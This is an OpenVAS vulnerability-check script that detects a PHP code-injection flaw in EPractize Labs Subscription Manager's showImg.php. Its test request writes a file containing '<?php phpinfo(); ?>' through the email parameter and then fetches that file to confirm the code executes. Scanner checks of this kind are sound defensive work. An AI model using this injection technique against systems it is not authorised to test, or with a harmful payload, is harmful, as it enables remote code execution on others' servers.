###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_EPractize_Subscription_Manager_50919.nasl 13994 2019-03-05 12:23:37Z cfischer $
#
# EPractize Labs Subscription Manager 'showImg.php' PHP Code Injection Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103401");
  script_bugtraq_id(50919);
  script_version("$Revision: 13994 $");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_name("EPractize Labs Subscription Manager 'showImg.php' PHP Code Injection Vulnerability");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/50919");
  script_xref(name:"URL", value:"http://www.epractizelabs.com/email-marketing/subscription-manager.html");
  script_xref(name:"URL", value:"http://archives.neohapsis.com/archives/fulldisclosure/current/0118.html");
  script_tag(name:"last_modification", value:"$Date: 2019-03-05 13:23:37 +0100 (Tue, 05 Mar 2019) $");
  script_tag(name:"creation_date", value:"2012-01-26 12:49:25 +0100 (Thu, 26 Jan 2012)");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2012 Greenbone Networks GmbH");
  script_dependencies("find_service.nasl", "http_version.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"summary", value:"EPractize Labs Subscription Manager is prone to a remote PHP code-
  injection vulnerability.");

  script_tag(name:"impact", value:"An attacker can exploit this issue to inject and execute arbitrary PHP
  code in the context of the affected application. This may facilitate a compromise of the application and
  the underlying system, other attacks are also possible.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure of
  this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"solution_type", value:"WillNotFix");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");

port = get_http_port( default:80 );
if( ! can_host_php( port:port ) )
  exit( 0 );

foreach dir( make_list_unique( "/Subscribe", "/subscribe", cgi_dirs( port:port ) ) ) {

  if( dir == "/" ) dir = "";
  buf = http_get_cache( item:dir + "/index.php", port:port );

  if( "<title> Mailing List" >< buf && "eplform" >< buf ) {

    vtstrings = get_vt_strings();
    file = vtstrings["lowercase_rand"] + ".php";

    url = dir + "/showImg.php?db=" + file + "&email=%3C?php%20phpinfo();%20?%3E";
    req = http_get( item:url, port:port );
    buf = http_keepalive_send_recv( port:port, data:req, bodyonly:FALSE );

    if( buf =~ "^HTTP/1\.[01] 200" ) {
      url = dir + "/" + file;
      if( http_vuln_check( port:port, url:url, pattern:"<title>phpinfo\(\)" ) ) {
        report = report_vuln_url( port:port, url:url );
        security_message( port:port, data:report );
        exit( 0 );
      }
    }
  }
}

exit( 99 );